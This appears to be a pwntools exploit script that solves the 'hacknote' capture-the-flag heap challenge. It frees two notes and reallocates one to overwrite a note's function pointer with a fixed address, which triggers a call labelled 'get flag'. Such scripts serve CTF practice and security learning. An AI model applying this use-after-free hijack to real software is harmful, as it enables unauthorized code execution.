from pwn import *

p = process('./hacknote')
context.log_level = 'debug'

def create(note_size,content) :
    p.sendlineafter('Your choice :','1')
    p.sendlineafter('Note size :',str(note_size))
    p.sendlineafter('Content :',content)

def delete(index) :
    p.sendlineafter('Your choice :','2')
    p.sendlineafter('Index :',str(index))

def show(index) :
    p.sendlineafter('Your choice :','3')
    p.sendlineafter('Index :',str(index))

create(32,'AAAAAAAA')
create(32,'AAAAAAAA')
delete(0)
delete(1)
payload = p32(0x8048986) + 'AAAA'
#gdb.attach(p)
create(8,payload)

#get flag
show(0)

p.interactive()
